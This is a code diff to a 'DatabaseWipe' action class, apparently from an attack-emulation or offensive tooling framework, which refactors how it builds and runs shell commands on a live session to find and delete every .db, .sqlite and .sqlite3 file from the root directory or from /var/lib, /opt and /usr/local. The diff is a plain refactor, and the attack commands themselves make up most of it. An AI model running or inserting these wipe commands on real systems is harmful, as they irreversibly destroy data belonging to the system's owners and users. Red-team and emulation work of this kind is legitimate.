@@ -187,6 +187,20 @@ class DatabaseWipe(Action):
         query.ret_all()
         return query
 
+    def _build_file_based_wipe_cmd(self, search_paths: list[str], message_prefix: str = "Removed database") -> str:
+        """
+        Build a command to find and remove database files.
+        
+        Args:
+            search_paths: List of directory paths to search (e.g., ['/'] or ['/var/lib', '/opt'])
+            message_prefix: Prefix for the success message (e.g., "Removed database" or "Removed database file")
+        
+        Returns:
+            Shell command string to find and remove database files
+        """
+        paths_str = " ".join(search_paths)
+        return f"""find {paths_str} -name "*.db" -o -name "*.sqlite" -o -name "*.sqlite3" 2>/dev/null | while read db; do rm -f "$db" && echo "{message_prefix}: $db"; done"""
+
     def function(self, sessions: SessionManager, artefacts: ArtefactManager, pattern: Pattern) -> ActionExecutionResult:
         """
         Execute database wiping commands.
@@ -248,14 +262,14 @@ class DatabaseWipe(Action):
         
         # SQLite database wiping (find and remove all .db files)
         elif service_protocol == 'sqlite':
-            sqlite_cmd = """find / -name "*.db" -o -name "*.sqlite" -o -name "*.sqlite3" 2>/dev/null | while read db; do rm -f "$db" && echo "Removed database: $db"; done"""
+            sqlite_cmd = self._build_file_based_wipe_cmd(['/'], "Removed database")
             output = live_session.run_command(sqlite_cmd)
             commands_executed.append(sqlite_cmd)
             output_lines.append(output)
         
         # Generic fallback: try to find and remove common database files
         else:
-            generic_cmd = """find /var/lib /opt /usr/local -name "*.db" -o -name "*.sqlite" -o -name "*.sqlite3" 2>/dev/null | while read db; do rm -f "$db" && echo "Removed database file: $db"; done"""
+            generic_cmd = self._build_file_based_wipe_cmd(['/var/lib', '/opt', '/usr/local'], "Removed database file")
             output = live_session.run_command(generic_cmd)
             commands_executed.append(generic_cmd)
             output_lines.append(output)
